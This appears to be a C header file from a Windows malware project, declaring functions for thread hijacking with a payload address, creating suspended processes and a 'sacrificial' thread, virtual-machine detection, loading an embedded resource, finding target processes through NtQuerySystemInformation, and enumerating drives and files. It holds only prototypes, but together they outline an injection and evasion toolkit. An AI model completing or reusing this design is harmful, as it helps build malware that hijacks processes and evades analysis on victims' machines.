#pragma once
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib"   )
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include "Win32FindDataArray.h"
#include "resource.h"
#include <winternl.h>
#define CRT_SECURE_NO_WARNINGS
typedef struct _RESOURCE
{
	PVOID  pAddress;
	size_t sSize;

}RESOURCE, *PRESOURCE;

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation) (
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);

__kernel_entry NTSTATUS NTQuerySystemInformation
(
	IN           SYSTEM_INFORMATION_CLASS SystemInfomaionClass,
	IN OUT       PVOID                    SystemInformation,
	IN           ULONG                    SystemInformationLength,
	OUT OPTIONAL PULONG                   ReturnLength
);

BOOLEAN CreateSuspendedProcess
(
	IN     PSTR    pProcessName,
	OUT PDWORD  pdwProcessId,
	OUT PHANDLE phProcessHandle,
	OUT PHANDLE phThreadHandle
);

BOOLEAN CreateSacrificialThread
(
	OUT PDWORD  pdwSacrificialThreadId,
	OUT PHANDLE phThreadHandle
);

BOOLEAN HijackThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress
);

BOOLEAN HijackLocalThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAdress,
	IN     SIZE_T sPayloadSize
);

INT8 CheckVM
(
	void
);

BOOLEAN FetchLocalThreadHandle
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwTargetThreadId,
	   OUT PHANDLE phTagetThread
);

BOOLEAN FetchResource
(
	   OUT PRESOURCE pResource_t
);

BOOLEAN FetchDrives
(
	IN OUT LPWSTR pPath
);

BOOLEAN FetchProcess
(
	IN	   LPWSTR  pProcessName,
	IN     PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle
);

BOOLEAN EnumRemoteProcessHandle
(
	IN      LPCWSTR  szProcName,
	    OUT PDWORD   pdwPID,
	    OUT PHANDLE  phProcess 
);

BOOLEAN EnumProcNTQuerySystemInformation(
	IN     LPCWSTR szProcName,
	   OUT PDWORD pdwPid,
	   OUT PHANDLE phProcess
);

LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
(
	IN     LPWSTR pPath
);

LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
(
    IN     LPWSTR pPath,
    IN OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t
);

HANDLE CreateVessel
(
	IN     LPWSTR pPath
);